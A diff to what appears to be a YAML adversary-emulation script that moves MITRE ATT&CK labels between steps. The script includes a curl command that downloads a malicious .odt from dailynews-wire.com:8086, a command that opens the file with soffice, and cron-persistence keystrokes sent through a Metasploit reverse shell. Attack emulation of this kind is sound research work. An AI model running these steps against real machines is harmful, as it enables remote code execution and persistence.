@@ -134,10 +134,6 @@ commands:
     cmd: type 
     input: "curl -o /home/judy/Nutzungshinweise.odt dailynews-wire.com:8086/index"
     session: client
-    metadata:
-      techniques: "T1105,T1204.002"
-      tactics: "Command and Control, Execution"
-      technique_name: "Ingress Tool Transfer,User Execution: Malicious File"
 
   - type: sleep
     seconds: 3
@@ -146,6 +142,10 @@ commands:
     cmd: key
     key: "enter"
     session: client
+    metadata:
+      techniques: "T1105,T1204.002"
+      tactics: "Command and Control, Execution"
+      technique_name: "Ingress Tool Transfer,User Execution: Malicious File"
 
   - type: sleep
     seconds: 5
@@ -155,10 +155,6 @@ commands:
     cmd: type 
     input: "soffice /home/judy/Nutzungshinweise.odt"
     session: client
-    metadata:
-      techniques: "T1204.002"
-      tactics: "Execution"
-      technique_name: "User Execution: Malicious File"
 
   - type: sleep
     seconds: 1
@@ -264,18 +260,10 @@ commands:
   - type: msf-session
     session: revshell
     cmd: ":inoremap jj <ESC>"
-    metadata:
-      techniques: "T1053.003"
-      tactics: "Persistence"
-      technique_name: "Scheduled Task/Job: Cron"
 
   - type: msf-session
     session: revshell
     cmd: "o"
-    metadata:
-      techniques: "T1053.003"
-      tactics: "Persistence"
-      technique_name: "Scheduled Task/Job: Cron"
 
   - type: msf-session
     session: revshell
@@ -288,18 +276,10 @@ commands:
   - type: msf-session
     session: revshell
     cmd: "jj"
-    metadata:
-      techniques: "T1053.003"
-      tactics: "Persistence"
-      technique_name: "Scheduled Task/Job: Cron"
 
   - type: msf-session
     session: revshell
     cmd: "o"
-    metadata:
-      techniques: "T1053.003"
-      tactics: "Persistence"
-      technique_name: "Scheduled Task/Job: Cron"
 
   - type: msf-session
     session: revshell
@@ -312,10 +292,6 @@ commands:
   - type: msf-session
     session: revshell
     cmd: "jj"
-    metadata:
-      techniques: "T1053.003"
-      tactics: "Persistence"
-      technique_name: "Scheduled Task/Job: Cron"
 
   - type: msf-session
     session: revshell
@@ -348,4 +324,5 @@ commands:
     session: revshell
     cmd: exit
 
-
+  - type: sleep
+    seconds: 30
